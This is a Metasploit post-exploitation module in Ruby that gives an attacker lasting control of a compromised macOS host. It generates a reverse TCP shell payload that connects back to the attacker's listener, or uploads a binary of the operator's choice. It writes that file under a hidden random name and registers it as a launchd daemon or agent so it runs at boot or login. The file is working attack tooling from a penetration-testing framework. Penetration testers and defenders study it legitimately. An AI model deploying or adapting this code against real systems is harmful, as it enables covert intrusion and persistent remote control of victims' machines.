# $Id: checkvm.rb 14812 2012-02-26 08:11:04Z rapid7 $
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/unix'
require 'msf/core/post/persistence'
require 'msf/core/post/osx/priv'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Unix
	include Msf::Post::Persistence
	include Msf::Post::Osx::Priv


	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Manage Persistent Payload Installer for osx platform',
			'Description'   => %q{
				This Module will create a boot persistent reverse Shell session by
				installing on the target host the payload that will be executed
				at system startup through launchd.

				REXE mode will transfer a binary of your choosing to remote host to be
				used as a payload.
				},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Alexandre Maloteaux <alex_maloteaux[at]metasploit.com>'],
			'Version'       => '$Revision: 14812 $',
			'Platform'      => [ 'osx' ],
			'SessionTypes'  => [ 'shell' ] 
			))

		register_options(
			[
				OptString.new('PLISTNAME',[false, 'The name to call the plist on remote system (org.name.plist)','']),
			], self.class)

		deregister_options('DELAY', 'RBATCHNAME')

	end


	def run

		# Set vars
		rexe = datastore['REXE']
		rexename = datastore['REXENAME'] 
		rexename = ".tmp_" + ::Rex::Text.rand_text_alpha((rand(4)+6)) if datastore['REXENAME'].nil? or datastore['REXENAME'].empty?
		
		@lhost = datastore['LHOST']
		@lport = datastore['LPORT']
		opts = datastore['OPTIONS']
		encoder = datastore['ENCODER']
		iterations = datastore['ITERATIONS']
		@host,@port = session.session_host, session.session_port

		@homedir = get_home_dir()
		@use_home_dir = true
		@force_no_execute = false 

		mode = 'payload'
		bin = ''

		return unless check_arch

		unless datastore['ENCODER'].nil? or datastore['ENCODER'].empty?
			print_error("Warning : Using an encoder is not recommended on this platform, test carefully first")
		end

		unless datastore['TEMPLATE'].nil? or datastore['TEMPLATE'].empty?
			print_error("Warning : Using a template is not recommended on this platform, test carefully first")
		end

		unless datastore['REXEPATH'].nil? or datastore['REXEPATH'].empty?
			@use_home_dir = false;
			rexepath = ::File.expand_path(datastore['REXEPATH'])
			if not dir_exists? rexepath
				print_error("The directory #{datastore['REXEPATH']} does not exists on the remote system")
				return
			end
		end

		if is_root?
			print_status("root session detected")
		end

		unless datastore['REXE'].nil? or datastore['REXE'].empty?
			mode = 'rexe'
			if datastore['REXENAME'].nil? or datastore['REXENAME'].empty?
				print_error("Please define REXENAME")
				return
			end

			if not ::File.exist?(datastore['REXE'])
				print_error("Rexe file does not exist!")
				return
			end

			bin = create_payload_from_file(rexe)
		else
			# Check that if a template is provided that it actually exists
			if datastore['TEMPLATE']
				if not ::File.exists?(datastore['TEMPLATE'])
					print_error "Template File does not exists!"
					return
				else
					template_bin = datastore['TEMPLATE']
				end
			end

			payload = "osx/x86/shell_reverse_tcp"
			
			# Create payload and bin
			print_status("Payload type : #{payload}")
			pay = create_payload(payload, @lhost, @lport, opts = "")
			return if not pay # payload not implemented
			raw = pay_gen(pay,encoder, iterations)
			bin = create_bin(template_bin, raw)
		end

		binpath = write_unix_bin_to_target(bin, rexename)
		make_persistent(binpath)

		# Start handler if set
		if mode == 'payload'
			create_multihand(payload, @lhost, @lport) if datastore['HANDLER']
		else
			print_error("Handler won't be started in this mode") if datastore['HANDLER'] == true
		end

		# Initial execution of bin file
		#@force_no_execute : osx in root mode will always launch the file in the launctl command, @force_no_execute prevent from lanching it twice
		if datastore['EXECUTE']
			target_shell_exec(binpath)  if @force_no_execute == false
		end
	end


	# Function for Creating persistent Bin
	#-------------------------------------------------------------------------------
	def create_bin(altbin, raw)
		if not altbin.nil?
			bin = ::Msf::Util::EXE.to_osx_x86_macho(session.framework, raw, {:template => altbin})
		else
			bin = ::Msf::Util::EXE.to_osx_x86_macho(session.framework, raw, {})
		end
		print_status("Persistent agent file is #{bin.length} bytes long")
		return bin
	end


	# Function to make the binary file persistent
	# Warning : on some system like OEL crontab may not be in PATH 
	#-------------------------------------------------------------------------------
	def make_persistent(binpath)

		#launchctl
		if datastore['PLISTNAME'].nil? or datastore['PLISTNAME'].empty?
			plistname = 'org.' + ::Rex::Text.rand_text_alpha((rand(4)+6)) + '.plist'
		else
			plistname = 'org.' + datastore['PLISTNAME'] + '.plist'
		end
		if datastore['KEEPALIVE']
			keepalive = '<true/>'
		else
			keepalive = '<false/>'
		end
		plist = %Q|<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
		<plist version="1.0">
		<dict>
			<key>Label</key>
			<string>#{plistname}</string>
			<key>Program</key>
			<string>#{binpath}</string>
			<key>RunAtLoad</key>
			<true/>
			<key>KeepAlive</key>
			#{keepalive}
		</dict>
		</plist>|
		plist.gsub!(/^\t\t/,'')
		if @homedir == '/' # root
			agentsdir = ::File.join(@homedir, "/Library/LaunchDaemons")
			plistfile = ::File.join(agentsdir, plistname)

			print_status("This file will be now executed and installed as a daemon")
			@force_no_execute = true # prevent from launching it twice
			write_file(plistfile, plist)
			print_status("Launchd plist file added in #{plistfile}")
			cmd_exec('launchctl load -w ' + plistfile)
		else
			#check if directory exist 
			agentsdir = ::File.join(@homedir, "/Library/LaunchAgents")
			plistfile = ::File.join(agentsdir, plistname)
			#Not created upon install
			unless dir_exists? agentsdir
				cmd_exec('mkdir -p ' + agentsdir)
			end
			write_file(plistfile, plist)
			print_status("Launchd plist file added in #{plistfile}")
			print_status("This file will be launched when the user login")
		end
	end

	def check_arch
		arch = get_arch
		unless arch == 'x86'
			print_error("This architecture is not suported with this module (#{arch})")
			return false
		end
		return true
	end
end

